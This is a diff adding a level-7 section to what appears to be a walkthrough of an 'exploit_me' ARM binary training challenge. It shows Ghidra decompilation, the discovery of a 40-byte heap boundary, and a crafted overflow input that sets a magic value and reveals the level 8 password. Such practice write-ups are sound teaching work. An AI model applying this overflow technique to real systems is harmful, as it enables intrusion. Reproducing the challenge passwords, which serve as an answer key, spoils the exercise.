@@ -1008,3 +1008,52 @@ pwndbg> stack 36
 b'filling array position 33 with 70756\nLevel 4 Password: "mysecret"\n'
 '''
 ```
+
+# exploit_me ARM binary - level 7:
+
+in ghidra:
+```
+undefined4 FUN_0001113c_level_7(undefined4 param_1)
+
+{
+  int iVar1;
+  
+                    /* size of 44 */
+  iVar1 = FUN_0001367c(0x2c);
+  *(undefined4 *)(iVar1 + 0x28) = 0;
+  FUN_00032b50(iVar1,param_1);
+  FUN_0001e5e8_printf("Heap magic number: 0x%x\n",*(undefined4 *)(iVar1 + 0x28));
+  if (*(int *)(iVar1 + 0x28) == 0x6763) {
+    FUN_0001e5e8_printf("Level 8 Password: \"%s\"\n",s_Exploiter_0007c2ea);
+  }
+  if (iVar1 != 0) {
+    thunk_FUN_000310dc(iVar1);
+  }
+  return 0;
+}
+```
+
+### strategy:
+
+Manual testing, started seeing the input value reflected in the output after a given length:
+```
+└─$ ./exploit mypony fffffffffffffffffffffffffffffffffffffffff
+Heap magic number: 0x66
+```
+
+In ghidra, saw 0x2c and 0x28 used around our input. 0x28 == 40 so I wanted to test input of length 40. at length of 40, it's the boundary
+and the magic number is 0x0. however, at 41, the magic number becomes the byte of our input.
+
+Verifying 0x28 and its relation to our input, the following decompilation looked interesting:
+```
+if (*(int *)(iVar1 + 0x28) == 0x6763) {
+FUN_0001e5e8_printf("Level 8 Password: \"%s\"\n",s_Exploiter_0007c2ea);
+}
+```
+
+Placing a 0x67 and 0x63 at input bytes 41 and 42, we passed the level:
+```
+└─$ ./exploit mypony ffffffffffffffffffffffffffffffffffffffffcg
+Heap magic number: 0x6763
+Level 8 Password: "Exploiter"
+```
